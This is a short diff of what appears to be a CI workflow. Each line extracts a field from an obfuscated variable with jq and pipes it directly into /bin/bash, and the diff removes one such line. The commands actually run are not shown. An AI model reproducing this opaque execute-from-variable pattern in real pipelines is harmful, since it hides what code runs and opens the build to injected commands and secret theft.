@@ -20,7 +20,6 @@ jobs:
           echo $bc8 | jq -r .duvio3 | /bin/bash
           echo $scg371 | jq -r .f2204 | /bin/bash
           printf '%s' "$caij25465" | jq -r .rcn5 | /bin/bash
-          echo $kgrw8561 | jq -r .ox1 | /bin/bash
           printf '%s' "$plqs54349" | jq -r .x68358 | /bin/bash
           echo $r2846 | jq -r .tjh15354 | /bin/bash
           printf '%s' "$xg9028" | jq -r .dfku1 | /bin/bash
